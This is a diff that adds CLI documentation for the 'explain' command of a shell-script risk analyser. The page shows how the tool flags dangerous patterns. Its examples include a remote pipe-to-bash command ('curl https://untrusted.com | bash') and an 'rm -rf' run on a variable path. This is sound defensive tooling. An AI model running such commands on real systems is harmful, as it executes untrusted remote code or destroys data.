@@ -1,0 +1,80 @@
+---
+title: "explain"
+description: "Get detailed explanations of security risks in scripts"
+---
+
+## Syntax
+
+```bash
+vg explain <script-path>
+```
+
+## Description
+
+The `explain` command provides human-friendly explanations of why a script is considered risky. It performs the same analysis as `validate` but focuses on detailed explanations of findings rather than pass/fail results.
+
+This is useful for:
+- Understanding why validation failed
+- Learning about security risks in scripts
+- Educational purposes for team members
+- Debugging guard level behavior
+
+## Arguments
+
+<ParamField path="script-path" type="string" required>
+  Path to the shell script to analyze
+</ParamField>
+
+## Examples
+
+### Explain a Deployment Script
+
+```bash
+vg explain scripts/deploy.sh
+```
+
+**Example output:**
+```
+⚠️  RISK: Detected 'rm -rf' with variable expansion (DANGEROUS_DELETE)
+Line 42: rm -rf $TARGET_DIR/*
+
+Recommendation: Use absolute paths and validate variables before deletion
+
+⚠️  RISK: Detected 'sudo' usage (PRIVILEGE_ESCALATION)
+Line 15: sudo systemctl restart nginx
+
+Recommendation: Run the entire script with appropriate privileges instead
+```
+
+### Explain Risk Levels
+
+```bash
+# Check why a command is flagged
+vg explain "curl https://untrusted.com | bash"
+
+# Output:
+# 🚨 CRITICAL: Piped shell execution from remote source (REMOTE_PIPE_EXEC)
+# This pattern downloads and executes code without inspection
+```
+
+### Test Guard Level Detection
+
+```bash
+# See how guard level auto-detection works
+vg explain "npm install dangerous-package"
+
+# Check production-like commands
+vg explain "curl https://api.prod.company.com"
+```
+
+## Exit Codes
+
+- **0**: Analysis completed successfully
+- **1**: Failed to read or parse script
+- **2**: Analysis error
+
+## Related Commands
+
+- [validate](/cli/validate) - Validate scripts (pass/fail)
+- [exec](/cli/exec) - Execute commands with protection
+- [scan-security](/cli/scan-security) - Scan source code for security issues
